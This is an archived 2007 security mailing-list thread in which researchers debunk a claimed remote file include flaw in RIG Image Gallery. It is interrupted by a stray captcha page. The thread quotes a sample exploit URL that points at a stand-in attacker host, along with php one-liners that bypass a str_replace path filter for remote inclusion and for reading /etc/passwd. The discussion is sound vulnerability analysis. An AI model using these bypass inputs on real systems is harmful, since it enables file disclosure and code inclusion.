=== Content from www.attrition.org_21e80a29_20250124_151109.html ===

# [VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability

**George A. Theall**
theall at tenablesecurity.com

*Tue Jul 31 02:06:16 UTC 2007*

* Previous message: [[VIM] true: Madoa RFI](001739.html)
* Next message: [[VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability](001746.html)
* **Messages sorted by:**
  [[ date ]](date.html#1743)
  [[ thread ]](thread.html#1743)
  [[ subject ]](subject.html#1743)
  [[ author ]](author.html#1743)

---

```
Another advisory from ilker Kandemir:

   <http://archives.neohapsis.com/archives/bugtraq/2007-07/0365.html>

Sample exploit:

   check_entry.php?dir_abs_src=[http://attacker.php?](http://attacker.php)

Actual code from 2006-06-24_v10:

                        ---- snip, snip, snip ----
   function rig_check_src_file($name)
   {
   ...
          // disable auto-globals from CGI params -- RM 20060624 - v1.0
           ini_set("register_globals", "0");

           // complain if that didn't work
           if (ini_get("register_globals") == 1)
           {
               echo "<h1>RIG Security Error</h1>";
   ...
               exit;
           }
   ...
           $name = str_replace("..", ".", str_replace("://", "", $name));
   ...
           return $name;
   }
   ...
   require_once(rig_check_src_file($dir_abs_src . "entry_point.php"));
                        ---- snip, snip, snip ----

By the way, there is no executable PHP code before the function definition.

I don't think any version of PHP allows for changing register_globals
via ini_set() -- see <<http://us3.php.net/manual/en/ini.php#ini.list>> --
which is probably why the author checks whether it is set and exits if
so. But regardless, the str_replace() later on in rig_check_src_file()
would certainly void the possibility of a remote file include attack.

George
--
[theall at tenablesecurity.com](http://www.attrition.org/mailman/listinfo/vim)

```

---

* Previous message: [[VIM] true: Madoa RFI](001739.html)
* Next message: [[VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability](001746.html)
* **Messages sorted by:**
  [[ date ]](date.html#1743)
  [[ thread ]](thread.html#1743)
  [[ subject ]](subject.html#1743)
  [[ author ]](author.html#1743)

---

[More information about the VIM
mailing list](http://www.attrition.org/mailman/listinfo/vim)



=== Content from www.attrition.org_2a2698ed_20250124_151110.html ===

# [VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability

**str0ke**
str0ke at milw0rm.com

*Tue Jul 31 13:19:55 UTC 2007*

* Previous message: [[VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability](001746.html)
* Next message: [[VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability](001749.html)
* **Messages sorted by:**
  [[ date ]](date.html#1747)
  [[ thread ]](thread.html#1747)
  [[ subject ]](subject.html#1747)
  [[ author ]](author.html#1747)

---

```
         // disable auto-globals from CGI params -- RM 20060624 - v1.0
          ini_set("register_globals", "0");

          // complain if that didn't work
          if (ini_get("register_globals") == 1)
          {
              echo "<h1>RIG Security Error</h1>";
  ...
              exit;
          }

With register globals = off he wouldn't be able to initialize the
variable anyways correct?

/str0ke

On 7/31/07, ascii <[ascii at katamail.com](http://www.attrition.org/mailman/listinfo/vim)> wrote:
> George A. Theall wrote:
> > But regardless, the str_replace() later on in rig_check_src_file()
> > would certainly void the possibility of a remote file include attack.
>
> I'm not saying that the product is vulnerable but that this statement
> is completely flawed, rig_check_src_file() is mostly useless (assumption
> taken from the George's code snippet, I haven't downloaded the original
> script).
>
> function rig_check_src_file($name) {
>   ...
>           $name = str_replace("..", ".", str_replace("://", "", $name));
>   ...
>           return $name;
> }
>
> This alone permits both local and remote file inclusions:
>
> Example a) Remote file inclusion
>
> php -r '$name="http:/:///www.tin.it/"; $name = str_replace("..", ".",
> str_replace("://", "", $name)); echo $name."\n"; require_once($name);'
> <http://www.tin.it/>
>
> Warning: require_once(): URL file-access is disabled in the server
> configuration in Command line code on line 1
>
> Warning: require_once(<http://www.tin.it/>): failed to open stream: no
> suitable wrapper could be found in Command line code on line 1
>
> Fatal error: require_once(): Failed opening required
> '[http://www.tin.it/'](http://www.tin.it/%27) (include_path='.:/usr/share/php5:/usr/share/php')
> in Command line code on line 1
>
> Example b) Local file inclusion
>
> php -r '$name=".../.../.../etc/passwd"; $name = str_replace("..", ".",
> str_replace("://", "", $name)); echo $name."\n"; require_once($name);'
> ../../../etc/passwd
>
> Warning: require_once(../../../etc/passwd): failed to open stream: No
> such file or directory in Command line code on line 1
>
> Fatal error: require_once(): Failed opening required
> '../../../etc/passwd' (include_path='.:/usr/share/php5:/usr/share/php')
> in Command line code on line 1
>
> Best regards,
> Francesco `ascii` Ongaro
> <http://www.ush.it/>
>
>
>
>

```

---

* Previous message: [[VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability](001746.html)
* Next message: [[VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability](001749.html)
* **Messages sorted by:**
  [[ date ]](date.html#1747)
  [[ thread ]](thread.html#1747)
  [[ subject ]](subject.html#1747)
  [[ author ]](author.html#1747)

---

[More information about the VIM
mailing list](http://www.attrition.org/mailman/listinfo/vim)



=== Content from www.attrition.org_9f805466_20250124_151111.html ===

# [VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability

**George A. Theall**
theall at tenablesecurity.com

*Tue Jul 31 13:26:39 UTC 2007*

* Previous message: [[VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability](001749.html)
* Next message: [[VIM] WTF: phpWebFileManager v0.5 (PN\_PathPrefix) Remote File Include Vulnerability](001744.html)
* **Messages sorted by:**
  [[ date ]](date.html#1748)
  [[ thread ]](thread.html#1748)
  [[ subject ]](subject.html#1748)
  [[ author ]](author.html#1748)

---

```
On 07/31/07 11:09, ascii wrote:

> George A. Theall wrote:
>> But regardless, the str_replace() later on in rig_check_src_file()
>> would certainly void the possibility of a remote file include attack.
>
> I'm not saying that the product is vulnerable but that this statement
> is completely flawed,
...
> php -r '$name="http:/:///www.tin.it/"; $name = str_replace("..", ".",
> str_replace("://", "", $name)); echo $name."\n"; require_once($name);'
> <http://www.tin.it/>

You're right, of course. But along with the register_globals check it
does prevent the example exploit from working.

George
--
[theall at tenablesecurity.com](http://www.attrition.org/mailman/listinfo/vim)

```

---

* Previous message: [[VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability](001749.html)
* Next message: [[VIM] WTF: phpWebFileManager v0.5 (PN\_PathPrefix) Remote File Include Vulnerability](001744.html)
* **Messages sorted by:**
  [[ date ]](date.html#1748)
  [[ thread ]](thread.html#1748)
  [[ subject ]](subject.html#1748)
  [[ author ]](author.html#1748)

---

[More information about the VIM
mailing list](http://www.attrition.org/mailman/listinfo/vim)



=== Content from securityreason.com_5cdb399b_20250124_151108.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from www.attrition.org_60e57e85_20250124_151111.html ===

# [VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability

**ascii**
ascii at katamail.com

*Tue Jul 31 15:43:41 UTC 2007*

* Previous message: [[VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability](001747.html)
* Next message: [[VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability](001748.html)
* **Messages sorted by:**
  [[ date ]](date.html#1749)
  [[ thread ]](thread.html#1749)
  [[ subject ]](subject.html#1749)
  [[ author ]](author.html#1749)

---

```
str0ke wrote:
> With register globals = off he wouldn't be able to initialize the
> variable anyways correct?

Yes, the advisory is fake. (I was just pointing out that the exploit
blocker was not the str_replace())

Best regards,
Francesco `ascii` Ongaro
<http://www.ush.it/>

```

---

* Previous message: [[VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability](001747.html)
* Next message: [[VIM] WTF: RIG Image Gallery (dir\_abs\_src) Remote File Include Vulnerability](001748.html)
* **Messages sorted by:**
  [[ date ]](date.html#1749)
  [[ thread ]](thread.html#1749)
  [[ subject ]](subject.html#1749)
  [[ author ]](author.html#1749)

---

[More information about the VIM
mailing list](http://www.attrition.org/mailman/listinfo/vim)


